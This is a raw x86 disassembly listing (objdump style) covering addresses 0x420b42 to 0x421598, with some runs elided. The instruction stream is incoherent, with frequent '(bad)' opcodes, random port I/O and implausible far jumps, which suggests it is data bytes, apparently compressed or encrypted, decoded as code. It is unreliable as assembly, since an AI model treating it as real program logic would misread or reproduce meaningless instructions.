  420b42:	fsub   st(6),st
  420b44:	rol    DWORD PTR [esi+0x7b7113b3],0xf
  420b4b:	adc    al,BYTE PTR ds:0x83628c31
  420b51:	sti    
  420b52:	mov    al,ds:0xd22ac260
  420b57:	push   0x56
  420b59:	das    
  420b5a:	out    0x2a,al
  420b5c:	pop    esp
  420b5d:	loope  0x420b45
  420b5f:	sti    
  420b60:	push   es
  420b61:	int    0x95
  420b63:	inc    BYTE PTR [eax-0x5f8251d9]
  420b69:	adc    al,0x70
  420b6b:	dec    ebx
  420b6c:	mov    al,ds:0x187ad057
  420b71:	mov    ebp,0xea475557
  420b76:	repnz aad 0xda
  420b79:	in     al,0xa1
  420b7b:	fiadd  WORD PTR [ebx+ebp*2-0x16]
  420b7f:	pop    ss
  420b80:	pop    eax
  420b81:	pop    ecx
  420b82:	nop
  420b83:	xchg   ebp,eax
  420b84:	sbb    eax,0xb2b47662
  420b89:	rep ins DWORD PTR es:[edi],dx
  420b8b:	repnz push 0x4c
  420b8e:	cmp    esp,DWORD PTR [eax-0xaa84eda]
  420b94:	adc    eax,eax
  420b96:	dec    cx
  420b98:	xor    al,0x6f
  420b9a:	dec    edi
  420b9b:	dec    ecx
  420b9c:	jecxz  0x420b71
  420b9e:	jle    0x420bae
  420ba0:	dec    DWORD PTR [edx+0x32852253]
  420ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba7:	std    
  420ba8:	(bad)  
  420ba9:	cmp    eax,0x955dad36
  420bae:	push   cs
  420baf:	stos   DWORD PTR es:[edi],eax
  420bb0:	call   0x0:0x26880813
	...
  420c13:	add    BYTE PTR [eax],al
  420c15:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c1b:	mov    edi,0x65553fba
  420c20:	pop    edx
  420c21:	stc    
  420c22:	mov    ah,0xb3
  420c24:	dec    esi
  420c25:	(bad)  
  420c26:	lods   al,BYTE PTR ds:[esi]
  420c27:	pop    ebx
  420c28:	add    DWORD PTR [eax],eax
  420c2a:	pop    es
  420c2b:	add    DWORD PTR [eax],eax
  420c2d:	add    BYTE PTR [esi],dh
  420c2f:	cmc    
  420c30:	sub    edi,DWORD PTR [ebp+ebp*8-0xf51b150]
  420c37:	out    dx,al
  420c38:	call   0x9ef2209d
  420c3d:	xchg   edx,eax
  420c3e:	fst    st(4)
  420c40:	push   0x4519b9e6
  420c45:	adc    al,0x3f
  420c47:	push   0xffffffb5
  420c49:	xor    DWORD PTR [edi-0x51946b37],ebp
  420c4f:	cmp    eax,0xeb8637f4
  420c54:	mov    bl,0xa7
  420c56:	pop    ebx
  420c57:	icebp  
  420c58:	mov    ecx,0x29abf1f2
  420c5d:	adc    al,0x8f
  420c5f:	cwde   
  420c60:	dec    edi
  420c61:	sub    BYTE PTR [eax+eax*2+0x3f599a3f],bl
  420c68:	dec    esp
  420c69:	ins    DWORD PTR es:[edi],dx
  420c6a:	popa   
  420c6b:	daa    
  420c6c:	mov    ebp,DWORD PTR [edi+0x7eb9d3d5]
  420c72:	lea    ebp,[ebx+0x4e]
  420c75:	clc    
  420c76:	jp     0x420c11
  420c78:	xchg   DWORD PTR [esp+edx*8],edx
  420c7b:	test   eax,0x3582b2b4
  420c80:	fld    TBYTE PTR [ebx+eiz*2+0x7bd7e900]
  420c87:	repz aad 0x75
  420c8a:	shr    DWORD PTR [eax-0x6f],cl
  420c8d:	std    
  420c8e:	in     al,dx
  420c8f:	xchg   ebp,eax
  420c90:	adc    DWORD PTR [eax],esi
  420c92:	popf   
  420c93:	(bad)  
  420c94:	cmp    BYTE PTR [ebp+0x388ca87e],ah
  420c9a:	xor    BYTE PTR [ebx],0x54
  420c9d:	jge    0x420c4e
  420c9f:	or     edx,DWORD PTR [eax+0x50]
  420ca2:	or     ebp,esi
  420ca4:	das    
  420ca5:	jne    0x420d08
  420ca7:	les    ebp,FWORD PTR ds:0x2435821c
  420cad:	jne    0x420c61
  420caf:	arpl   WORD PTR [ecx-0x177dd33f],si
  420cb5:	aas    
  420cb6:	lods   eax,DWORD PTR ds:[esi]
  420cb7:	xchg   edx,eax
  420cb8:	cld    
  420cb9:	test   al,0x46
  420cbb:	in     eax,dx
  420cbc:	pop    ss
  420cbd:	outs   dx,BYTE PTR ds:[esi]
  420cbe:	sti    
  420cbf:	jle    0x420ca8
  420cc1:	xchg   esp,eax
  420cc2:	fmul   QWORD PTR [ebx-0x33d0a5b0]
  420cc8:	scas   al,BYTE PTR es:[edi]
  420cc9:	stc    
  420cca:	cmp    DWORD PTR [esi],0x22aad743
  420cd0:	jno    0x420c66
  420cd2:	xor    BYTE PTR [edi],ah
  420cd4:	ror    BYTE PTR [ecx-0x1b],0x48
  420cd8:	jle    0x420c77
  420cda:	stos   DWORD PTR es:[edi],eax
  420cdb:	adc    esp,DWORD PTR [edi]
  420cdd:	inc    ebx
  420cde:	test   DWORD PTR [ebx+0x6f185a3b],edi
  420ce4:	push   es
  420ce5:	mov    fs,WORD PTR ds:[eax+0x6e]
  420ce9:	pusha  
  420cea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ceb:	les    ebp,FWORD PTR [esp+edx*2-0x6a]
  420cef:	lea    eax,[ebp+0x18308720]
  420cf5:	rcl    al,0x1c
  420cf8:	cdq    
  420cf9:	cwde   
  420cfa:	xchg   dh,ah
  420cfc:	and    esi,DWORD PTR [edi+0x6a]
  420cff:	test   eax,0x8f26b634
  420d04:	jle    0x420d76
  420d06:	prefetchwt1 BYTE PTR [ebx+0x72fc8fd]
  420d0d:	pop    ebp
  420d0e:	aaa    
  420d0f:	inc    ecx
  420d10:	mov    bl,0xa2
  420d12:	ret    0xd718
  420d15:	sbb    DWORD PTR [ebx+esi*8+0x43cd79e],eax
  420d1c:	and    al,0x80
  420d1e:	or     BYTE PTR [eax+eiz*4+0x34b39394],bh
  420d25:	ss pop eax
  420d27:	cld    
  420d28:	(bad)  
  420d29:	xlat   BYTE PTR ds:[ebx]
  420d2b:	aam    0x84
  420d2d:	and    eax,0x203a2070
  420d32:	pushf  
  420d33:	adc    eax,0x61
	...
  420d94:	add    BYTE PTR [eax],al
  420d96:	out    0x1e,eax
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0xaa0c1cea
  420da3:	cmc    
  420da4:	retf   
  420da5:	dec    edi
  420da6:	mov    bl,0x5c
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    dh,ch
  420daf:	mov    ecx,0x92d55197
  420db4:	scas   al,BYTE PTR es:[edi]
  420db5:	out    0x52,eax
  420db7:	mov    ah,0xa7
  420db9:	arpl   WORD PTR [edi-0x5b],cx
  420dbc:	mov    DWORD PTR [edx],ecx
  420dbe:	ins    BYTE PTR es:[edi],dx
  420dbf:	jmp    0x420d4f
  420dc1:	jle    0x420d44
  420dc3:	inc    ecx
  420dc4:	ss adc al,0x59
  420dc7:	arpl   WORD PTR [esi-0x5f534822],di
  420dcd:	jnp    0x420e0c
  420dcf:	(bad)  
  420dd0:	cmc    
  420dd1:	aam    0xf7
  420dd3:	pop    es
  420dd4:	push   ebx
  420dd5:	test   eax,0xc83eac8f
  420dda:	mov    ah,0x48
  420ddc:	not    ebp
  420dde:	ret    
  420ddf:	add    eax,0xf419a6ab
  420de4:	add    DWORD PTR [esi-0x7ab58742],0xffffffb4
  420deb:	daa    
  420dec:	into   
  420ded:	xor    ebx,DWORD PTR [ebp-0x11]
  420df0:	data16 dec bp
  420df3:	lods   eax,DWORD PTR ds:[esi]
  420df4:	add    bh,BYTE PTR [esi+0x4aaad98b]
  420dfa:	mov    eax,ds:0xe16d5992
  420dff:	(bad)  
  420e00:	mov    ecx,0xb69367be
  420e05:	xchg   esp,eax
  420e06:	push   es
  420e07:	add    al,0x43
  420e09:	(bad)  
  420e0a:	out    dx,eax
  420e0b:	and    edi,ecx
  420e0d:	adc    al,0xb9
  420e0f:	call   0x492994cd
  420e14:	(bad)  
  420e16:	mov    eax,0x48a834bb
  420e1b:	xchg   edi,eax
  420e1c:	and    ch,dl
  420e1e:	(bad)  
  420e1f:	cwde   
  420e20:	scas   al,BYTE PTR es:[edi]
  420e21:	aas    
  420e22:	dec    esi
  420e23:	pop    ds
  420e24:	mov    esp,0x120d8f1c
  420e29:	or     al,0x94
  420e2b:	fs jo  0x420ded
  420e2e:	mov    cl,0x0
  420e30:	scas   eax,DWORD PTR es:[edi]
  420e31:	mov    dh,0xa6
  420e33:	enter  0xf5b2,0xe4
  420e37:	pop    eax
  420e38:	add    dh,ah
  420e3a:	xor    bh,BYTE PTR [ebx-0x233edd49]
  420e40:	pop    ds
  420e41:	xchg   ebp,eax
  420e42:	mov    eax,0x1649f51f
  420e47:	lahf   
  420e48:	sub    eax,DWORD PTR [ebp*2+0x1eacb529]
  420e4f:	jmp    0xa5a7:0xef540cac
  420e56:	xor    DWORD PTR [eax+ecx*2],edi
  420e59:	call   0xa81a1984
  420e5e:	mov    ah,0xab
  420e60:	lods   eax,DWORD PTR ds:[esi]
  420e61:	xor    esi,DWORD PTR [ebx+0x32]
  420e64:	aas    
  420e65:	inc    edi
  420e66:	xchg   esi,eax
  420e67:	push   ds
  420e68:	sbb    al,0x48
  420e6a:	mov    ecx,0xe06f8b77
  420e6f:	out    0x86,eax
  420e71:	xor    ebx,DWORD PTR [ecx+eax*4+0x49db4110]
  420e78:	shr    edx,cl
  420e7a:	ror    ecx,1
  420e7c:	in     eax,dx
  420e7d:	dec    ecx
  420e7e:	adc    BYTE PTR [edi+0x10],cl
  420e81:	cmp    eax,0x5c5f5db
  420e86:	adc    DWORD PTR [ecx+0x6231484b],ecx
  420e8c:	xor    BYTE PTR [ecx+0x6846c882],al
  420e92:	jle    0x420e88
  420e94:	loopne 0x420e9d
  420e96:	mov    ds:0x2864a557,eax
  420e9b:	sub    ch,BYTE PTR [ebp+0x426d32ca]
  420ea1:	in     eax,dx
  420ea2:	enter  0x1ec2,0x63
  420ea6:	in     eax,0xb4
  420ea8:	mov    bl,0x41
  420eaa:	pop    ecx
  420eab:	or     eax,0x1e95b20
  420eb0:	aad    0xe8
  420eb2:	or     dl,ah
  420eb4:	loope  0x420eb6
	...
  420f16:	and    BYTE PTR [edi-0x28082cbe],dl
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	fadd   QWORD PTR ds:[ebp+0x28]
  420f25:	pop    es
  420f26:	mov    edx,0x700015d
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    BYTE PTR [ecx],dl
  420f2f:	jns    0x420eb7
  420f31:	sub    esp,DWORD PTR [ebx]
  420f33:	jge    0x420f86
  420f35:	in     al,0xcd
  420f37:	jg     0x420f37
  420f39:	jnp    0x420f17
  420f3b:	push   ss
  420f3c:	cwde   
  420f3d:	or     al,0x6e
  420f3f:	or     BYTE PTR [ecx-0x48],bl
  420f42:	cmp    esp,DWORD PTR [edx+0x4bbbbb1e]
  420f48:	cs dec ecx
  420f4a:	les    eax,FWORD PTR [edi]
  420f4c:	shl    DWORD PTR [ecx],1
  420f4e:	push   esp
  420f4f:	(bad)  
  420f50:	sub    DWORD PTR [ecx],ebx
  420f52:	pop    edi
  420f53:	lds    ebx,FWORD PTR [eax]
  420f55:	rcl    BYTE PTR [esi],1
  420f57:	mov    cs,WORD PTR [edi-0x3f8b72d4]
  420f5d:	push   ecx
  420f5e:	bound  esp,QWORD PTR [esi+ecx*2+0x4c]
  420f62:	xor    BYTE PTR [esi],dh
  420f64:	mov    ds:0x78930dd,eax
  420f69:	nop
  420f6a:	dec    edx
  420f6b:	lahf   
  420f6c:	push   esp
  420f6d:	adc    BYTE PTR [edx-0x7cd7c317],0xbc
  420f74:	loope  0x420fe8
  420f76:	adc    bl,BYTE PTR [ecx+0x71d5a05a]
  420f7c:	ss or  al,0x18
  420f7f:	fwait
  420f80:	mov    dl,0xc6
  420f82:	minps  xmm6,XMMWORD PTR [edx]
  420f85:	in     eax,0xef
  420f87:	sub    BYTE PTR [ecx-0x5687b05d],dh
  420f8d:	bnd jge 0x420fa1
  420f90:	push   ecx
  420f91:	xchg   edi,eax
  420f92:	dec    edi
  420f93:	jl     0x420f35
  420f95:	push   esp
  420f96:	clc    
  420f97:	and    dh,BYTE PTR [ecx]
  420f99:	ja     0x420f40
  420f9b:	push   eax
  420f9c:	into   
  420f9d:	mov    al,ds:0xffc99d74
  420fa2:	and    al,0xd5
  420fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fa5:	xchg   esi,eax
  420fa6:	nop
  420fa7:	sbb    esp,ebx
  420fa9:	(bad)  
  420faa:	pop    eax
  420fab:	and    ah,dh
  420fad:	pop    edi
  420fae:	add    edx,DWORD PTR [ebx+0x53]
  420fb1:	xor    edi,esp
  420fb3:	mov    BYTE PTR [ebx+edi*4],cl
  420fb6:	sub    DWORD PTR [ecx+0x2cc51081],esp
  420fbc:	pop    es
  420fbd:	add    DWORD PTR [eax-0x53],ebx
  420fc0:	sbb    DWORD PTR [ebx-0x48],eax
  420fc3:	jmp    0x1bd20845
  420fc8:	test   eax,0x7ec8cac5
  420fcd:	call   FWORD PTR [esi]
  420fcf:	in     eax,dx
  420fd0:	push   0xffffff93
  420fd2:	jmp    0x9c43:0x5705bfd4
  420fd9:	sti    
  420fda:	ret    
  420fdb:	ins    DWORD PTR es:[edi],dx
  420fdc:	xchg   esp,eax
  420fdd:	dec    esi
  420fde:	in     eax,0x3e
  420fe0:	imul   edx,DWORD PTR [eiz*1-0x5b2b10cd],0x6b7d35fc
  420feb:	(bad)  
  420fec:	push   DWORD PTR [eax-0x5104f796]
  420ff2:	das    
  420ff3:	fxch   st(2)
  420ff5:	mov    edi,0x960e62e5
  420ffa:	dec    ebx
  420ffb:	cli    
  420ffc:	jo     0x42102a
  420ffe:	inc    edi
  420fff:	fld    DWORD PTR [ebp-0x26a727f0]
  421005:	mov    cl,0x4a
  421007:	mov    bl,0xca
  421009:	push   ebx
  42100a:	lods   eax,DWORD PTR ds:[esi]
  42100b:	cmp    eax,0x89676ccb
  421010:	inc    edx
  421011:	adc    bh,BYTE PTR ds:0xd94f3bca
  421017:	inc    edx
  421018:	mov    bl,0x7f
  42101a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42101b:	stos   BYTE PTR es:[edi],al
  42101c:	pop    ebx
  42101d:	sbb    DWORD PTR [esi+0x5],esp
  421020:	push   0xffffffd5
  421022:	adc    edi,DWORD PTR [eax-0x3a]
  421025:	pusha  
  421026:	(bad)  
  421027:	enter  0x990c,0xdb
  42102b:	xor    DWORD PTR [esp+ecx*8-0x2d2900b2],eax
  421032:	jg     0x421044
  421034:	sub    eax,0x0
	...
  421095:	add    BYTE PTR [edi-0x243925a2],bl
  42109b:	(bad)  
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0x50dd77fe
  4210a5:	add    cl,al
  4210a7:	pop    esi
  4210a8:	add    DWORD PTR [eax],eax
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [ebx+ecx*2-0x446bfa6b],bl
  4210b4:	xor    eax,0x8e6b0fb3
  4210b9:	add    al,0xd4
  4210bb:	mov    ebx,0xfed8206f
  4210c0:	jmp    0x421129
  4210c2:	mov    esi,0xf0d5950a
  4210c7:	mov    ch,0x59
  4210c9:	dec    edi
  4210ca:	lahf   
  4210cb:	mov    ecx,0x9f0ab2a7
  4210d0:	jge    0x42109c
  4210d2:	dec    ebx
  4210d3:	push   edx
  4210d4:	stc    
  4210d5:	jno    0x4210f9
  4210d7:	aad    0x54
  4210d9:	mov    edi,0xa80f7c68
  4210de:	outs   dx,DWORD PTR ds:[esi]
  4210df:	adc    ebx,esi
  4210e1:	add    BYTE PTR [ebx],0xc2
  4210e4:	adc    eax,DWORD PTR [esi-0x6295f3d2]
  4210ea:	mov    al,ds:0x4f463360
  4210ef:	jb     0x421075
  4210f1:	(bad)  
  4210f2:	aad    0xbe
  4210f4:	pop    esp
  4210f5:	dec    esp
  4210f6:	jmp    ebp
  4210f8:	into   
  4210f9:	and    BYTE PTR ds:0x2bb5aed5,dh
  4210ff:	sub    bh,dl
  421101:	pop    ss
  421102:	stos   DWORD PTR es:[edi],eax
  421103:	adc    eax,0xeb79edf4
  421108:	xor    eax,0x67424db0
  42110d:	sub    esp,eax
  42110f:	push   cs
  421110:	push   ss
  421111:	sub    al,0x34
  421113:	stos   DWORD PTR es:[edi],eax
  421114:	(bad)  [esi]
  421116:	pusha  
  421117:	or     DWORD PTR [esi-0x3a],edx
  42111a:	repz sub eax,0xe2b18ab4
  421120:	lds    ebp,FWORD PTR [esi+0xe]
  421123:	inc    eax
  421124:	fisttp DWORD PTR [ecx+ebx*2]
  421127:	jb     0x4211a5
  421129:	mov    ah,BYTE PTR [eax+0xfa51455]
  42112f:	xchg   edx,eax
  421130:	push   0xa0bd0974
  421135:	pusha  
  421136:	mov    fs,WORD PTR [ebx]
  421138:	js     0x421138
  42113a:	and    eax,0x65777a65
  42113f:	push   edx
  421140:	pop    edi
  421141:	sub    eax,0x4e96336c
  421146:	fcmovnu st,st(5)
  421148:	sahf   
  421149:	fcmovne st,st(1)
  42114b:	out    0xbe,al
  42114d:	in     eax,0xa9
  42114f:	scas   al,BYTE PTR es:[edi]
  421150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421151:	cdq    
  421152:	sbb    cl,dl
  421154:	or     bh,BYTE PTR [ebx-0x472c7ed8]
  42115a:	adc    dh,al
  42115c:	icebp  
  42115d:	jnp    0x421189
  42115f:	adc    DWORD PTR ds:0x1fb02784,esi
  421165:	add    bl,BYTE PTR ds:0x8c0638b0
  42116b:	sbb    DWORD PTR [edi],ebp
  42116d:	and    ch,ch
  42116f:	adc    al,0xce
  421171:	int    0x15
  421173:	mov    ebx,0x26f6a29c
  421178:	leave  
  421179:	mov    ah,0x49
  42117b:	hlt    
  42117c:	imul   ebp,edi,0xffffff97
  42117f:	cwde   
  421180:	push   esi
  421181:	cli    
  421182:	out    dx,al
  421183:	mov    cs,WORD PTR [edi]
  421185:	ins    DWORD PTR es:[edi],dx
  421186:	pop    eax
  421187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421188:	xchg   edi,eax
  421189:	pop    esp
  42118a:	dec    esp
  42118b:	ror    BYTE PTR [ecx-0x66],0x1d
  42118f:	outs   dx,DWORD PTR ds:[esi]
  421190:	mov    dl,0xa5
  421192:	rcl    BYTE PTR [esi],1
  421194:	jp     0x421125
  421196:	leave  
  421197:	add    BYTE PTR ds:0xa5fbb549,cl
  42119d:	push   cs
  42119e:	dec    edx
  42119f:	push   ss
  4211a0:	test   eax,0x993fc52f
  4211a5:	popa   
  4211a6:	fst    QWORD PTR [edx]
  4211a8:	jl     0x421157
  4211aa:	fnstsw WORD PTR [ecx]
  4211ac:	int    0x6
  4211ae:	push   es
  4211af:	mov    cl,0x76
  4211b1:	jns    0x4211c4
  4211b3:	adc    al,0xeb
	...
  421215:	add    BYTE PTR [esi-0x700870e1],bl
  42121b:	idiv   esi
  42121d:	jg     0x421280
  42121f:	pop    es
  421220:	and    BYTE PTR [ecx+0x19],cl
  421223:	sub    bh,BYTE PTR [esi+0x15fc862]
  421229:	add    BYTE PTR [edi],al
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    BYTE PTR [ebx+0x1c2ded71],dh
  421233:	push   edx
  421234:	(bad)  
  421235:	push   edx
  421236:	mov    edi,eax
  421238:	pop    edx
  421239:	push   esi
  42123a:	mov    ah,0xa5
  42123c:	push   esi
  42123d:	sbb    ebx,DWORD PTR [ecx-0x5f500a0a]
  421243:	push   0xeaec735f
  421248:	mov    fs,WORD PTR [ebx+0x58fda567]
  42124e:	sbb    edx,DWORD PTR [ecx]
  421250:	sub    ah,BYTE PTR [ecx+0x86467bf]
  421256:	outs   dx,BYTE PTR ds:[esi]
  421257:	push   ss
  421258:	pop    es
  421259:	inc    eax
  42125a:	not    esp
  42125c:	or     BYTE PTR [eax+0x12],dh
  42125f:	sub    ebx,ebp
  421261:	sahf   
  421262:	push   ecx
  421263:	lods   eax,DWORD PTR ds:[esi]
  421264:	popa   
  421265:	rcl    DWORD PTR [edx-0x42],0xf
  421269:	call   0xd566a92a
  42126e:	jecxz  0x4212d3
  421270:	mov    ds:0x200ed522,eax
  421275:	leave  
  421276:	ret    
  421277:	(bad)  
  421278:	lock add esp,DWORD PTR [esi]
  42127b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42127c:	push   ecx
  42127d:	jmp    0x42124a
  42127f:	scas   eax,DWORD PTR es:[edi]
  421280:	into   
  421281:	lods   al,BYTE PTR ds:[esi]
  421282:	push   edi
  421283:	add    DWORD PTR [ebx-0x55],0x28
  421287:	mov    eax,0xd762c87b
  42128c:	imul   esi,DWORD PTR [ecx],0xd9916eb0
  421292:	out    0x65,al
  421294:	mov    ds:0xcaae1bb5,al
  421299:	cli    
  42129a:	shl    DWORD PTR [ebx],1
  42129c:	jl     0x4212a6
  42129e:	rol    DWORD PTR [edi+ebx*4-0x6b8ca68b],cl
  4212a5:	out    dx,eax
  4212a6:	lods   al,BYTE PTR ds:[esi]
  4212a7:	push   es
  4212a8:	inc    edx
  4212a9:	loop   0x4212fd
  4212ab:	(bad)  
  4212ac:	sbb    DWORD PTR [edx],0xffffffca
  4212af:	sar    BYTE PTR [ebx+eax*2],cl
  4212b2:	shl    ebp,1
  4212b4:	adc    DWORD PTR [ecx+0x65],ebx
  4212b7:	pop    eax
  4212b8:	fpatan 
  4212ba:	or     BYTE PTR [ebx-0x45700a21],bl
  4212c0:	fadd   QWORD PTR [esi]
  4212c2:	xchg   ecx,eax
  4212c3:	xchg   edx,eax
  4212c4:	push   ecx
  4212c5:	rcl    BYTE PTR [ecx-0x765c7a38],0x1c
  4212cc:	rcr    BYTE PTR [edi+0x54],0xd1
  4212d0:	stos   BYTE PTR es:[edi],al
  4212d1:	sbb    eax,0x5fdfe6fd
  4212d6:	inc    ecx
  4212d7:	mov    ecx,0xae2f8263
  4212dc:	adc    BYTE PTR [esi+0x30],bh
  4212df:	ja     0x4212de
  4212e1:	ss test al,0x36
  4212e4:	shl    DWORD PTR [eax+ecx*1-0x6c556562],0x77
  4212ec:	les    eax,FWORD PTR [esi+0x16]
  4212ef:	mov    dh,0x2b
  4212f1:	xchg   edx,eax
  4212f2:	or     eax,0x3c0734b5
  4212f7:	and    ecx,DWORD PTR [ecx-0x13]
  4212fa:	ss scas al,BYTE PTR es:[edi]
  4212fc:	mov    cl,0xa7
  4212fe:	or     eax,0x1c93b569
  421303:	jge    0x4212a6
  421305:	das    
  421306:	cmp    al,0x7b
  421308:	mov    cs:0xd3392b67,eax
  42130e:	(bad)
  421311:	xchg   ebx,eax
  421312:	xor    bl,BYTE PTR [ebx]
  421314:	mov    esp,0x1972b63e
  421319:	mov    esi,0x6d5881d0
  42131e:	inc    eax
  42131f:	aaa    
  421320:	lods   eax,DWORD PTR ds:[esi]
  421321:	(bad)  
  421322:	cmp    ebx,DWORD PTR [eax-0x6c2e9971]
  421328:	adc    BYTE PTR [edx],0x28
  42132b:	xchg   DWORD PTR fs:[ebx],ebp
  42132e:	mov    cl,0x2f
  421330:	into   
  421331:	fmul   DWORD PTR [ecx+0x9d19]
	...
  421393:	add    BYTE PTR [eax],al
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0xe6c04b0
  4213a3:	mov    ecx,DWORD PTR [esi+0x160cfa4]
  4213a9:	add    BYTE PTR [edi],al
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [ecx-0x1],dh
  4213b0:	sub    al,BYTE PTR [ebp+0x414a58a2]
  4213b6:	scas   al,BYTE PTR es:[edi]
  4213b7:	outs   dx,BYTE PTR ds:[esi]
  4213b8:	push   ecx
  4213b9:	ins    DWORD PTR es:[edi],dx
  4213ba:	(bad)  
  4213bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213bd:	adc    bl,BYTE PTR [edx+0x61]
  4213c0:	ret    0x7dc
  4213c3:	lds    esi,FWORD PTR [ebx]
  4213c5:	pop    ss
  4213c6:	dec    ebx
  4213c7:	lahf   
  4213c8:	cdq    
  4213c9:	jo     0x4213e5
  4213cb:	test   DWORD PTR [ecx],ecx
  4213cd:	xor    DWORD PTR [edi+0x7b5beb1a],esp
  4213d3:	dec    ebp
  4213d4:	stos   DWORD PTR es:[edi],eax
  4213d5:	les    ecx,FWORD PTR [eax+0x40]
  4213d8:	out    dx,eax
  4213d9:	cld    
  4213da:	push   cs
  4213db:	push   esi
  4213dc:	lods   al,BYTE PTR ds:[esi]
  4213dd:	xchg   edx,eax
  4213de:	jg     0x421374
  4213e0:	test   DWORD PTR [ecx+0x79b67b],ebx
  4213e6:	mov    edi,0xd982d1ea
  4213eb:	aam    0xea
  4213ed:	adc    DWORD PTR [eax+0x70c08a48],ebp
  4213f3:	mov    esi,0xb938b431
  4213f8:	sbb    al,0xd6
  4213fa:	pop    ecx
  4213fb:	jle    0x421382
  4213fd:	inc    ebp
  4213fe:	mov    eax,ecx
  421400:	fadd   DWORD PTR [ebp-0x45]
  421403:	dec    esp
  421404:	cmp    BYTE PTR [ebp+0x68],0xb3
  421408:	jge    0x421402
  42140a:	sbb    al,0x85
  42140c:	or     al,bl
  42140e:	gs push ecx
  421410:	mov    ds:0xd4b0e624,eax
  421415:	mov    al,ds:0x4c6f12d9
  42141a:	rcr    esp,1
  42141c:	aaa    
  42141d:	mov    bh,0x81
  42141f:	adc    BYTE PTR [edx],cl
  421421:	dec    ebp
  421422:	mov    eax,ds:0x4ce8cdb7
  421427:	mov    eax,ds:0xf9e0d9e
  42142c:	frstor [ecx]
  42142e:	jle    0x421474
  421430:	mov    ch,0x6b
  421432:	adc    eax,0x8f4945e0
  421437:	aad    0x6b
  421439:	jmp    0x421455
  42143b:	into   
  42143c:	aam    0x5a
  42143e:	je     0x42148e
  421440:	ja     0x4213ea
  421442:	add    eax,DWORD PTR [ebp-0x54]
  421445:	cli    
  421446:	stc    
  421447:	mov    WORD PTR [eax+0x25],ds
  42144a:	jl     0x421453
  42144c:	mov    BYTE PTR [esi*4-0x1e9a68d],bl
  421453:	ror    BYTE PTR [eax],1
  421455:	pop    edx
  421456:	lods   eax,DWORD PTR ds:[esi]
  421457:	hlt    
  421458:	mov    ebp,DWORD PTR [eax*4+0x2cae1fb]
  42145f:	shl    eax,cl
  421461:	(bad)  [ecx+eiz*2-0x7930db88]
  421468:	or     cl,BYTE PTR [ebp-0x6c5e6ad0]
  42146e:	out    0x5c,al
  421470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421471:	shl    al,cl
  421473:	adc    BYTE PTR [esi-0x6ed12f19],0xa2
  42147a:	call   0xdee:0xd96af318
  421481:	repnz lods eax,DWORD PTR ds:[esi]
  421483:	sbb    DWORD PTR [eax+0x43],0x291a0601
  42148a:	or     DWORD PTR ds:0xc186a61f,esi
  421490:	push   0x15863170
  421495:	mov    bh,0xf9
  421497:	jmp    0x8b374dbe
  42149c:	aas    
  42149d:	sti    
  42149e:	pop    ebp
  42149f:	(bad)  
  4214a0:	xchg   ecx,eax
  4214a1:	xchg   ebx,eax
  4214a2:	or     ah,BYTE PTR [ebx-0x34a9597e]
  4214a8:	arpl   WORD PTR [edi+0x702c158c],si
  4214ae:	inc    ebp
  4214af:	stos   BYTE PTR es:[edi],al
  4214b0:	xchg   edx,eax
  4214b1:	mov    ecx,0x391fb9
	...
  421516:	(bad)  
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	aaa    
  421523:	jbe    0x421504
  421525:	jae    0x4214fd
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    dl,al
  42152f:	rcl    DWORD PTR [esp+eax*8+0x22653ae1],cl
  421536:	fist   WORD PTR [eax+edx*1]
  421539:	daa    
  42153a:	lock dec esi
  42153c:	test   DWORD PTR [esi],0x7e1d6d03
  421542:	inc    ebx
  421543:	loopne 0x42155b
  421545:	in     eax,0xeb
  421547:	dec    esp
  421548:	fst    DWORD PTR [esi+0x294d79bf]
  42154e:	dec    esi
  42154f:	pop    ebx
  421550:	(bad)  
  421551:	outs   dx,BYTE PTR ds:[esi]
  421552:	imul   ecx,DWORD PTR [ecx-0x16],0x9a6977fd
  421559:	xor    DWORD PTR [ebp+0x5c],edx
  42155c:	mov    bh,0xdf
  42155e:	or     DWORD PTR [edi-0x1d470707],esi
  421564:	push   0xffffffb6
  421566:	pop    ss
  421567:	add    ch,BYTE PTR [ebx+0x77f7e378]
  42156d:	pop    es
  42156e:	and    DWORD PTR [eax],eax
  421570:	sti    
  421571:	inc    ebx
  421572:	jns    0x42152e
  421574:	loop   0x42150e
  421576:	xchg   edi,eax
  421577:	mov    DWORD PTR [ecx],ebp
  421579:	adc    BYTE PTR [eax-0x1f],0xc7
  42157d:	imul   esi,esp,0x71
  421580:	gs mov eax,esi
  421583:	adc    DWORD PTR [esi+eax*4-0x5e],ecx
  421587:	mov    ds:0xf9649aee,eax
  42158c:	loopne 0x42150e
  42158e:	cdq    
  42158f:	cmp    ecx,DWORD PTR es:[eax]
  421592:	ds adc eax,0xe5566a30
  421598:	call   0x9cb88b8a
